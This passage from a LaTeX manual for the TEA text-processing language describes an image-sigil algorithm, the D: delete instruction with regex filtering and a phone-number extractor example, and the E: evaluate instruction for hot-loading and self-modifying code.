\item Dynamic [sub-/inner-]program construction via neat string expression composition using \texttt{G:} and \texttt{X:}.
\item non-TEA numeric and arbitrary text-processing via \texttt{Z:} and JavaScript.
\item Pure offline-processing and functionality.
\item And more!
\end{enumerate} 
 

We can appreciate what the program can do, by looking at sample screenshots of this code in use, via a mobile computer program as shown in the following figures:

\begin{figure}[H]
  \centering
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/nsigil_intro.png}
    \caption{N-SIGIL v1.0.1: Intro Greeting Interface}
    \label{FIGNSIGIL}
  \end{subfigure}
  \hfill
  \begin{subfigure}[b]{0.45\textwidth}
    \includegraphics[width=\textwidth]{resources/images/nsigil_ossi.png}
    \caption{N-SIGIL v1.0.1: a basic qrcode for the base-10 o-SSI}
    \label{FIGNSIGIL2}
  \end{subfigure}
  \caption{Phone Snapshots of WEB TEA in action}
  \label{FIGNSIGILDEMO}
\end{figure}


    \begin{figure}[H]
      \centering
      \includegraphics[height=0.6\textheight,]{resources/images/nsigil_qrcode.png}\\
        \caption{N-SIGIL v1.0.1: a basic qrcode for just the number 1}
      \label{FIGNSIGIL3}
    \end{figure}
    
    
  Finally, and before we move on to the next chapter, it might help some readers of the TEA code in the example application we have just covered, by understanding clearer, what the underlying mathematics or algorithm is that make this \textbf{N-Sigil} utility work as it does, especially without using any sophisticated graphics and no imported batteries other than the use of JavaScript to compute some of the program's aspects we couldn't resolve readily in plain TEA. Also, this might help those might wish to port the program to CLI TEA, so that they perhaps know well, how to handle the important aspects of the algorithm. We specify the minimal \textbf{N-Sigil Algorithm} hereafter...
  
  
  \begin{alg}[The \textbf{N-SIGIL Algorithm}: $\text{gen\_sigil}(DATA, nCol, nRow)$]
\label{ALGNSIGIL}
$ $\\
\begin{enumerate}
\item \textbf{GIVEN} the dimensions of the target image as width, $nCol$, and height, $nRow$.

\item{ \textbf{COMPUTE} the total number of cells, ``pixels" or ``bits" that our image shall contain, as such:

\begin{equation}
vN = nCol \times nRow
\end{equation}

}
\item{ \textbf{GIVEN DATA}\footnote{We say ``DATA" because, in the most general sense, and given we are designing an algorithm that generates an image for any supported text --- makes sense for especially TEA, since the language knows no other datatypes other than just text, but also that, in the general sense, any arbitrary data that could be expressed using a visual method such as a QRCode or other form of sigilization, and which method fundamentally has a way to do this for a pure-number, might as well be considered a basis for any general generator, since any other datatype can, in principle at least, be reduced to some pure number by some meaningful method.} in form of a pure number, $vIN$, and for which we intend to generate a unique or corresponding image in some non-trivial encoding --- the N-SIGIL encoding in our case.
}

\item{ \textbf{PREPROCESS} the input, $vIN$, so that it can be properly processed for the rest of the algorithm. Essentially, \textbf{COMPUTE} $vA$, our first parameter based off of $vIN$, the user's input, and $vN$, cardinality of the image in terms of pixels, as such:

\begin{equation}
vA = \lfloor \frac{vIN}{vN} + (vIN \mod vN) \rfloor
\end{equation}

}

\item{ Further, \textbf{ADJUST} $vA$, so that it can map to a value within the range of columns: essentially, compute some $vAA$ as such:

\begin{equation}
vAA =  \lfloor \frac{vA}{nCol} + (vA \mod nCol) \rfloor
\end{equation}

}

\item Then, given what we have, derive some other essential image generating parameters as such:

\item{\textbf{COMPUTE} $vB$ based off of $vA$ and  so that it can map to a value within the range of columns:

\begin{equation}
vB =  (vN + vA) \mod nCol
\end{equation}

}

\item{\textbf{COMPUTE} $vC$ based off of $vB$ and  so that it can map to a value within the range of columns:

\begin{equation}
vC =  |vN - vB| \mod nCol
\end{equation}

}

\item{\textbf{COMPUTE} $vD$ based off of $vC$ and  so that it can map to a value within the range of rows:

\begin{equation}
vD =  \lfloor \frac{vC*vN}{2*vROW} + \lfloor \frac{vC*vN}{2} \rfloor \rfloor \mod nRow
\end{equation}

}

\item{\textbf{COMPUTE} $vE$ based off of $vD$ and  so that it can map to a value within the range of rows:

\begin{equation}
vE =  (\lfloor \frac{|vD - \frac{vN}{2}|}{vRow} \rfloor + \lfloor |vD - \frac{vN}{2}| \rfloor) \mod vRow
\end{equation}

}


\item{\textbf{COMPUTE} $vF$ based off of $vN$ and  so that it can map to a value within the range of columns:

\begin{equation}
vF =  (\lfloor \frac{vN}{2*nCol} \rfloor + \lfloor \frac{vN}{2} \rfloor) \mod nCol
\end{equation}

}

\item { \textbf{CONSTRUCT} the \textbf{Sigil Coordinates Specification} as sequence of 12 (x,y) coordinate pairs as such, where the last/final 6 are derived from the first 6 merely by swapping the positions of the terms such as we have $(x,y) \rightarrow (y,x)$. Essentially, we shall have this specification set:

\begin{multline}
vCOORDINATES = \langle (1,vAA), (2,vB), (3,vC), (4,vD), (5,vE), (6,vF),\\
 (vAA,1), (vB,2), (vC,3),(vD,4), (vE,5), (vF,6) \rangle
\end{multline}

}

\item { \textbf{PROCESS} the \textbf{Resultant Matrix} of the $vN$ pixels, perhaps 1 row at a time, for $nRow$, and one column on each row at a time, for $nCol$, in such a way that:
\begin{itemize}
\item{ \textbf{IF} the pixel $P_{(x,y)}$ is such that $(x,y) \in vCOORDINATES$, \textbf{THEN}:
\begin{itemize}
\item \textbf{PRINT DARK BOX}: `X' 
\end{itemize}
\item{\textbf{ELSE:}
\begin{itemize}
\item \textbf{PRINT LIGHT BOX\footnote{In our original implementation of the algorithm, we merely printed ``\#" for the LIGHT/unmarked pixels, and `X' for the marked/DARK ones. However, experimentation and taste might vary, and so, sometimes one might just decide to keep the LIGHT pixels as just plain WHITE-SPACE character such as `` " in this case, so that the final image is essentially only painted in the marked regions only --- which somewhat better brings out the ``sigil" or ``qrcode" aspect we want.}}: `` " 
\end{itemize}
}
}
\end{itemize}

}
\end{enumerate}
$\qed$
\end{alg}
  
  
 
 
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: D
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{D: DELETE}
\label{CHAPD}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{DELETE}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Delete something from the AI
	\item Delete everything BUT something from the AI
	\item Implement Filters
	\item Reduce Strings to Specific Patterns
	\item Eliminate All White-space
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{D:}}
  \label{TABTAZD}
\end{table}




\section{SEMANTICS of D:}
\label{SECSEMD}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

d: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{d:REGEX \\d:RX1:RX2:…:RXN} & Delete from AI all sections matching the single regular expression REGEX or any of the given regular expressions RX1, RX2,…, RXN\\
 
 d.:REGEX & \textbf{The Exceptional Delete Instruction} that deletes from AI all sections matching the single regular expression REGEX. It doesn't accept multiple parameters, and so, everything after the first ``:" is treated as part of the pattern. It is one of few TEA commands using the ``." Qualifier.\\

\rowcolor{lightgray}\bfseries d!: & Delete all white-space from the AI (same as g:)\\
 
 \makecell[l]{d!:REGEX \\d!:RX1:RX2:…:RXN}& The Inverse of d:, for which only \textbf{sections not matching} the given patterns are deleted from AI. \\
 
 
\rowcolor{lightgray}\bfseries \makecell[l]{d*:vREGEX\\d*:vRX1:vRX2:…:vRXN} & Like the d:REGEX and d:RX1:…:RXN except, referencing the patterns stored in the named vaults.\\
 
 
 \makecell[l]{d*!:vREGEX \\d*!:vRX1:vRX2:…:vRXN}& Like the d!:REGEX and d!:RX1:…:RXN except, referencing the patterns stored in the named vaults. \\
 
 \hline
\end{tabular}
\caption{The Semantics of D:}
\label{TABSEMD}
\end{table}




\section{NOTES about D:}
\label{SECNOTESD} 


So much can be accomplished in programming with TEA --- one of few programming languages that is \textbf{text-processing} oriented by design. And talking of text-processing, note that many problems can be reduced to the need to identify and eliminate from some text or sequence, elements that match a particular pattern or those that do not match one or more patterns. We shall attempt to illustrate these things using basic examples...

First, note that one can appreciate \textbf{D:} by the following illustrative examples:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances of `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA] |#(="bC CB B B")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

But 


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances of `aA']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:aA |#(="bC CB BA aB") because no pattern "aA"
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


So, realize that the difference between the last two programs, despite being subtle, does matter --- the first invoked the \textbf{delete instruction} with an argument that is a regular expression using a \textit{character class} --- \textit{[aA]} --- whereas the later version used a regular expression ``aA" that essentially gets interpreted as \textit{a followed by A}.

Whereas, if we modify the program again such as:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances NOT `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[^aA] |#(="Aa") uses negated character class
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

We get something similar to what we would have obtained in case we had used the same pattern as in the original program, but with the \textbf{D!:} instruction:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all things NOT `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d!:[aA] |#(="Aa")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


That flexibility is essential because of the way logic using regular expressions works --- there might be scenarios in which writing a pattern to match what needs to be eliminated is easier than writing one for what needs to be retained, whereas the inverse might be true in some other cases. So, creativity and experimentation shall determine which of the forms of \textbf{D:} to use for what purpose.

And then, concerning using \textbf{D:} to eliminate white space, consider the program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete ALL WHITE-SPACE]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d!: |#(="bCCBBAaB")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Other quirks of the delete instruction can be appreciated with the following example:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: more D:]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA] |#(="bC CB B B")
d:.B |#(="bC")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

This last example could also be simplified by leveraging the fact that \textbf{D:} allows us to chain the patterns too --- essentially, we can use it in the forms \textit{d:RX1:RX2:…:RXN} or \textit{d!:RX1:RX2:…:RXN} or the related vault-referencing forms such as \textit{d*:vRX1:vRX2:…:vRXN} or 
 \textit{d*!:vRX1:vRX2:…:vRXN}. Thus, the above last example can be rewritten as:
 
 
 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: D: with chained patterns]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA]:.B |#(="bC")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Finally, note that the parameterized inverse of the Delete command makes implementing powerful complex filters easier. For example, we eliminate anything in AI that isn't a punctuation mark using the following terse program\footnote{Please note that though the code listing shown seems to indicate that the program contains some extraneous symbols after the second-last `\}', and yet, the color-coding for the TEA-source-code pretty-printer being used for typesetting this book is what has limitations when dealing with complex TEA expressions. Otherwise, the program is expressed verbatim in its complete and essential form as is, and can be tried out on the \textbf{WEB TEA IDE} as part of the standard TEA program collection: \url{https://tea.nuchwezi.com}} 


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: De PUNCTURA Filter]
  \begin{lstlisting}[language=TEA]
d!:{[\\ \[\]!"#$%&'()*+,-./:;<=>?@^_`{|}~]} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

As can be seen/appreciated when considering what the TEA regular expression standard is --- refer to \textbf{\hyperref[SECREGEXP]{Chapter \ref{SECREGEXP}}} --- note that we could also write the above program in more compact form as: \texttt{d!:\textbackslash{}W} --- with the important caveat though being that, this later version also preserves new-line characters since it merely filters out all word characters.

 
\section{EXAMPLE APPLICATIONS of D:}
\label{SECEXAMPD}

  
As explained in the section highlighting the general purposes/use-cases of the \textbf{DELETE} instruction, we find that implementing filters is among its major purposes, and so, we shall use one example to help paint a picture for what one might use \textbf{D:} for in real-life.


\subsection{EXAMPLE 1: \textbf{DATA MINING:} EXTRACTING WELL-FORMATTED TELEPHONE CONTACTS from TEXT}
\label{SECEXAMP1D}


The following example, is going to be tested against a sample text such as:



\begin{figure}[H]
  \centering
  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Input Text Containing Phone Contacts]
---[ TEA WEB IDE DOCS v1.1 ]---

0704464749

Welcome to the Transforming Executable Alphabet [TEA] WEB Integrated Development Environment.

EXAMPLE: https://tea.nuchwezi.com/?fc=https://example.com/mcnemesis/+1-414-123456/raw/zha.tea


17. BACK PROPAGATE: Click to copy and load the text:+256704464749 currently in TEA Output space as the new text in the TEA Input space. 

---[FURTHER DOCS | TEA RESEARCH]

In case you still wish to explore +256 414 554 685 more concerning TEA, this WEB IDE, or any other aspects of the TEA project, definitely start by visiting the TEA GitHub0705953500 Project [linked to on the MENU], or visit the TEA Research and TEA Community links as provided on the MENU.  +254-1

Phone: 0772 609649 | 101
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}
\end{figure}


The essential TEA source for a program that we might use to extract all the phone numbers in that sample text is as such:

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: PHONE CONTACT EXTRACTOR]
  \begin{lstlisting}[language=TEA]
d!:\+[1-9]\d{7,14}:\+?[0-9][-. \d]{7,28}
h!:{[^\d]} 
k:\d 
r!:[^\d]:{ } 
r!:\W+:{ }
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: PHONE CONTACT Extractor}
  \label{FIGD}
\end{figure}


And when we run that code against the specified sample text, the output we shall get is as shown hereafter...


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[title=Sample EXTRACTED Output Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
0704464749 1 414 123456 256704464749 256 414 554 685 0705953500 0772 609649
  \end{tcolorbox}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}
\end{figure}

Of course, the example program makes some assumptions about what a valid phone number might be given internationally acceptable patterns, and the variety of phone number expressions we need to deal with in the sample text provided, and so, in a more realistic scenario, it might be that instead of using multiple match-patterns, we only need 1, or that we instead need more than the two we have specified here, or that we need to constraint or extend the ones we have specified in the arguments passed to \textbf{D!:}, so that we implement an extractor that is most suitable for the problem at hand.

\vspace{1em}


Also, besides the \textbf{D!:} instruction in that example program, most of the other TEA code included is to help clean-up the extracted contacts so that we limit or eliminate anything that is not part of the contact, and also format the result with minimal white-space between either the contacts or the sub-sequences making up a particular contact.

\vspace{1em}

Finally, realize that even though the original/input text did contain several numerical sections such as strings as ``v1.1", ``101", etc. and incomplete phone numbers such as `` +254-1", and yet, thanks to the power of the \textbf{D!:} filter and how we structured our pattern-matching regular expressions, any such values in the input are not polluting our final output.



 
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: E
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{E: EVALUATE}
\label{CHAPE}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{EVALUATE}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Process memory as though it were a TEA program
	\item A self-contained function/procedure facility for TEA programs
	\item Securely processing External/Imported TEA source-code
	\item Mechanism for Securely Executing Auto-Generated TEA Code
	\item Facility for Self-Modifying Programs
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{E:}}
  \label{TABTAZE}
\end{table}




\section{SEMANTICS of E:}
\label{SECSEME}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

e: & [\textit{Implicit Context Unaware Evaluation}] Process the contents of AI as an external TEA program, with its initial AI as the EMPTY STRING and set the final IO from that program as the IO for the current instruction\\

\rowcolor{lightgray}\bfseries e:STR & [\textit{Explicit Context Unaware Evaluation}] Process the contents of STR as an external TEA program, but with current AI as its initial AI and set the final IO from that program as the IO for the current instruction\\
 
 e!: & [\textit{Implicit Extended Context Aware Evaluation}] Parse the contents of AI as a TEA program, and inject the found TEA instructions in it inline into the calling main TEA program---essentially, modifies the main program by injecting new code into it, replacing the original E: instruction in the calling program with the new program instructions, then continues normal processing in the main/calling program, starting from the first instruction in the newly injected instructions if any – the EMPTY STRING becomes input to that first instruction, otherwise (in case no TEA instructions were found) continues to the next instruction in the calling, unmodified program, with the AI set to the EMPTY STRING.\\

\rowcolor{lightgray}\bfseries e!:STR & [\textit{Explicit Extended Context Aware Evaluation}] Same as E!:, but passes current AI to the first instruction in the extension/injected TEA program,  otherwise (in case no TEA instructions were found) passes it on to the next instruction in the main/calling TEA program unmodified.\\
 
 \makecell[l]{e*: \\e*!:}& INERT \\
 
 
\rowcolor{lightgray}\bfseries e*:vNAME & Same as E:STR, but processing string stored in vault named vNAME\\
 
 
e*!:vNAME & Same as E!:STR, but processing string stored in vault named vNAME\\
 
 \hline
\end{tabular}
\caption{The Semantics of E:}
\label{TABSEME}
\end{table}




\section{NOTES about E:}
\label{SECNOTESE} 


Many mature programming languages --- GPLs especially, do offer some mechanism by which code that is originally not part of the main program might not only be imported/hot loaded into the main program, but also that such imported code might be executed adjacent to/parallel the main program or inline (as part of the main program). 

\vspace{1em}

Such code might for example be functionality that was not originally designed into the main program, but which is later needed for some specific tasks to be supported --- in which case, the external program code might be thought of as a kind of \textit{plugin} or \textit{extension}\footnote{In the past for example, and before the inventor of TEA worked on the language, they had worked on another language known as \textbf{Cwa Script} that together with an embeddable/pluggable Software Operating Environment (SOE)  known as \textbf{DNAP}\cite{lutalo2020dnap}, that for either web or desktop or mobile apps [in virtually any language], would make it easy for existing software to be readily extended or evolved with new functionality originally not part of the main software in a sense similar to how an existing web-page might be extended by leveraging ``external functionality" loaded say via an I-frame.}. But also, many languages encourage or support a facility for composing a program from various, somewhat independent or semi-independent components in the form of say libraries (such as DLLs for the C/C++ language), modules and/or sub-modules (such as in Python or JavaScript), etc.  

\vspace{1em}

Typically, for compiled languages such as C or C++, such code shall also be loaded when it is in a compiled form closest to the final/target architecture and instruction set of the associated machine or technology platform, so that, one does not or can not directly take a runtime string and execute it directly as though it were new code made available to the main program. However, for especially interpreted languages such as JavaScript, Python, LISPs, Ruby, or even compiled languages such as Erlang that run on a virtual machine with ability to hotload code or perform Just-In-Time compilation of code even loaded via strings, the ability to extend the main program with functionality parsed or read directly  from runtime-strings is not only possible but it designed into the language core.

\vspace{1em}

Below, we summarize the behavior of hot-loading code across several compiled and interpreted languages so that one might come to appreciate how TEA does it:


\begin{table}[h!]
\centering
\begin{tabular}{|l|p{3.5cm}|p{3.5cm}|p{3.5cm}|}
\hline
\textbf{Language} & \textbf{Direct Evaluation (e.g., \texttt{eval})} & \textbf{Compilation Required} & \textbf{Can Modify Main Program State} \\
\hline
\multicolumn{4}{|c|}{\textbf{Compiled Languages}} \\
\hline
C & \makecell[{{p{3.5cm}}}]{No (\texttt{system()} or dynamic loading via \texttt{dlopen})} & \makecell[{{p{3.5cm}}}]{Yes (external compilation needed)} & \makecell[{{p{3.5cm}}}]{Limited (via shared libraries or function pointers)} \\
\hline
C++ & \makecell[{{p{3.5cm}}}]{No (\texttt{system()} or dynamic/shared libraries)} & \makecell[{{p{3.5cm}}}]{Yes (compile to shared object)} & \makecell[{{p{3.5cm}}}]{Limited (via dynamic linking and function pointers)} \\
\hline
Erlang & \makecell[{{p{3.5cm}}}]{Yes (\texttt{erl\_eval}, \texttt{code:load\_binary})} & \makecell[{{p{3.5cm}}}]{Optional (hot code loading supported)} & \makecell[{{p{3.5cm}}}]{Yes (can replace modules at runtime)} \\
\hline
Java & \makecell[{{p{3.5cm}}}]{No (\texttt{JavaCompiler}, \texttt{ClassLoader})} & \makecell[{{p{3.5cm}}}]{Yes (compile to bytecode)} & \makecell[{{p{3.5cm}}}]{Yes (via reflection and dynamic class loading)} \\
\hline
\multicolumn{4}{|c|}{\textbf{Interpreted Languages}} \\
\hline
Python & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{exec()})} & No & \makecell[{{p{3.5cm}}}]{Yes (can define/modify variables, functions, classes)} \\
\hline
JavaScript & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{Function()})} & No & \makecell[{{p{3.5cm}}}]{Yes (modifies global/local scope)} \\
\hline
Ruby & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{instance\_eval})} & No & \makecell[{{p{3.5cm}}}]{Yes (can alter program state and define methods)} \\

\hline
TEA & \makecell[{{p{3.5cm}}}]{Yes (\texttt{e:}, \texttt{e!:}, \texttt{e*:} or \texttt{e*!:})} & No & \makecell[{{p{3.5cm}}}]{Yes (\texttt{e!:, e!:STR, e*!:vC} can alter caller program state)} \\

\hline
\end{tabular}
\caption{Comparison of Hot-Loading Code from Strings in Compiled vs Interpreted Languages}
\label{TABCOMPLANGE}
\end{table}


And so, with that introduction out of the way, one should realize that this functionality is indeed not only a standard feature of a good programming language, but is also essential for certain kinds of especially dynamic or generic programming. 

\vspace{1em}

Below, we shall look at some basic examples of the \textbf{Evaluate} instruction in TEA, and thereafter, delve into some non-trivial examples.

\vspace{1em}

So, first, note that one could appreciate \textbf{E:} by the following illustrative examples which, for purposes of helping make comparisons of the various different ways code hot-loading can be done in TEA, all perform the same essential function --- they load the same exact program just in different contexts, and all \textbf{MUST} return the output ``AAW" when successfully run:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Implicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{i!:AAA|d:^A|r:$:W} | e:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Implicit Extended Context Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{i!:AAA|d:^A|r:$:W} | e!:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e:"i!:AAA|d:^A|r:$:W" 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e:{i!:AAA|d:^A|r:$:W} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Extended Context Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e!:{i!:AAA|d:^A|r:$:W} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Context-Unaware Vault Program Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:{i!:AAA|d:^A|r:$:W} |
 e*:vPROG  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Injection-Evaluation with In-Vault Program]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:{i!:AAA|d:^A|r:$:W} |
 e*!:vPROG  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Injection-Evaluation with In-Vault Program v2]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:"i!:AAA|d:^A|r:$:W" | 
e*!:vPROG   
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


The above eight TEA programs are actually equivalent though different and all approaching the same problem in different ways --- essentially, executing external/injected TEA code from within a main/host TEA program. 

\vspace{1em}

However, to truly appreciate the power of \textbf{E:}, let us consider the following non-trivial program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Non-Trivial Injection and Context-Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:ABC

l:lHEW
h:

e!:{
    v:
    v:vE:XYZ
    |v!:
    |v:vOL
    |g*:-< >-:vE:vOL
    |v:vMIX
    |l:lGEN
    |p!:5
    |x*:vMIX
    |f:[ai]:lMASK
    |l:lSALT
    |s:1_0_1
    |f:[a1]:lGEN
    }

l:lMASK
g!:**  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


It not only demonstrates all the tricky aspects of a TEA program, however, it is a great example for how to create self-modifying TEA programs. Essentially, all the TEA code inside the \texttt{e!:\{…\}} block ends up not being processed as an external TEA program, but gets injected into the main program, and uses its AI and existing label blocks! This program will for example return a string starting with the injected sub-string ``XYZ" such as ``XYZ**5uaikq" if the injected program reached a state where the AI contains the sub-string ``ai", otherwise will return a string starting with ``A++B++C" such as ``\verb$A++B++CXYZ-< >-5hlca1_0_1x$" in case the program reached a state where the AI contains the substring ``a1". A full appreciation of how this program works is shown in a runtime DEBUG dump of this program in the official CLI TTTT tests\cite{cli_tttt}.

\vspace{1em}

Among the peculiarities of that example is that the injected/external program contains logic that not only modified the main program (such as creating new code/l-blocks with instructions such as \texttt{l:lSALT}), but also references sections of the main program otherwise not directly visible to the injected/external program (such as the \texttt{f:[ai]:lMASK} branching instruction).


\section{EXAMPLE APPLICATIONS of E:}
\label{SECEXAMPE}

  
Given that TEA's \textbf{Evaluate} instruction is ideal for creating not just dynamic programs but rather programs that can also modify themselves, we shall want to first take a moment to appreciate what in general is known\cite{copilot_assistant} about such scenarios as when one might need a self-modifying program:



\begin{table}[htbp]
\centering
\caption{Non-Trivial Scenarios for Self-Modifying Programs}
\renewcommand{\arraystretch}{1.4}
\begin{tabularx}{0.8\textwidth}{>{\raggedright\arraybackslash}p{2.5cm} >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}X}
\hline
\textbf{Case} & \textbf{Scenario} & \textbf{Why Self-Modify} & \textbf{Example} \\
\hline
Embedded Optimization & Devices with limited resources need to adapt to changing conditions. & To rewrite code for more efficient algorithms or disable unused features, saving memory and power. & A satellite reprograms its data compression logic based on signal quality. \\
\hline
Evolutionary Algorithms & Programs evolve to solve complex problems like strategy or learning. & Code mutates and recombines to simulate biological evolution for optimal solutions. & A game AI rewrites its own tactics based on win/loss feedback. \\
\hline
Security and Anti-Tampering & Software must resist reverse engineering or unauthorized changes. & Dynamic code changes obscure logic and detect tampering attempts. & A DRM system modifies its decryption routine to prevent static analysis. \\
\hline
Simulation and Testing & Platforms need to test many behavioral permutations rapidly. & Injecting logic on the fly allows fast prototyping without restarting or recompiling. & An autonomous vehicle simulator rewrites decision trees during runtime. \\
\hline
JIT Compilation & Runtime systems optimize performance-critical paths. & Frequently used code paths are rewritten for speed and efficiency. & A JavaScript engine replaces interpreted code with compiled machine code. \\
\hline
Multi-Architecture Support & Programs must run across diverse systems from a single binary. & Code rewrites itself to load appropriate modules or instructions per environment. & A bootloader modifies its startup sequence based on detected CPU architecture. \\
\hline
Meta-Learning AI & AI agents improve their own learning processes. & Agents restructure their logic based on performance feedback. & A reinforcement learning agent rewrites its reward function to improve convergence. \\
\hline
\end{tabularx}
\end{table}

That said, note that the example we are going to look at, despite not being exactly inspired by a real-life problem, does help illustrate just how useful both self-modification of a TEA program might be when two important features are combined; 

\begin{enumerate}
\item The ability to automatically generate valid TEA program code on the fly and from nothing.
\item The ability to execute a stored string as though it were a TEA program --- in this particular case, we shall only focus on the \textbf{Context Unaware} evaluation scenarios.
\end{enumerate}


\subsection{EXAMPLE 1: \textbf{DYNAMIC PROGRAMMING:} AUTO-GENERATION of VALID SELF-MODIFYING CODE}
\label{SECEXAMP1E}


The simplest TEA program one might write is the so-called \texttt{HELLO WORLD} program, which, as shown below, simply does one thing --- prints the message ``Hello World" and quits.


\begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=A Basic TEA Hello World Program]
  \begin{lstlisting}[language=TEA]
i!:{Hello World}
